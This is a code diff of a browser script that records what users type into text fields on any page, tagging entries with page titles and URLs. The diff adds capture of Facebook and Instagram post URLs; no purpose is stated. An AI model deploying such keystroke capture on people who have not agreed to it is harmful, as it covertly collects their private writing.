@@ -8,12 +8,10 @@ var time = new Date().getTime();
 var data = {};
 var shouldSave = false;
 var lastLog = time;
-data_form = document.title + "^~^" + document.URL + "^~^";
 var num = 0;
 var flag = [];
 
 document.addEventListener('keydown', function(e){
-    
     e = e || window.event;
     var class_arr = e.target.className.split(' ');
     if((typeof e.target.value !== 'undefined' && (e.target.value == "" || e.target.value=="\n")) || (typeof e.target.value === 'undefined' && (e.target.innerText == "" || e.target.innerText == "\n"))){
@@ -46,23 +44,37 @@ document.addEventListener('keyup', function (e) {
         tmp_num = num;
         num++;
     }
+    var post_url = null;
+
+    if(window.location.href.includes("https://www.facebook.com/") && e.target.closest("form").parentNode.closest("form").ft_ent_identifier.value){
+        post_url = "https://www.facebook.com/"+e.target.closest("form").parentNode.closest("form").ft_ent_identifier.value;
+    }
+
+    if(window.location.href.includes("https://www.instagram.com/") && e.target.closest("article").getElementsByClassName("c-Yi7")[0].href){
+        post_url = e.target.closest("article").getElementsByClassName("c-Yi7")[0].href;
+    }
+
     if(typeof e.target.value !== 'undefined'){
         if((e.target.value == "" || e.target.value == "\n")&& (e.keyCode == '8' || e.keyCode == '46')) flag[tmp_num] = 1;
-        log(e.target.value, tmp_num);
+        log(e.target.value, tmp_num, post_url);
     }
     else if(e.target.tagName == 'DIV'){
         if((e.target.innerText == "" || e.target.innerText == "\n")&& (e.keyCode == '8' || e.keyCode == '46')) flag[tmp_num] = 1;
-        log(e.target.innerText, tmp_num);
+        log(e.target.innerText, tmp_num, post_url);
     }
     
 });
 
 // Key'ed on JS timestamp
-function log(input, input_num) {
+function log(input, input_num, post_url) {
     var now = new Date().getTime();
     if (input == '' || input == '\n') return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
     if(typeof data[time] === 'undefined') data[time] = {};
-    data[time][input_num] = data_form + input;
+    data[time][input_num] = document.title + "^~^" + document.URL + "^~^" + input;
+    if(post_url != null){
+        console.log(post_url);
+        data[time][input_num] = document.title + "^~^" + post_url+"^~^"+input;
+    }
     shouldSave = true;
     lastLog = now;
     console.log("[Dr.pepper]Logged : ", input);
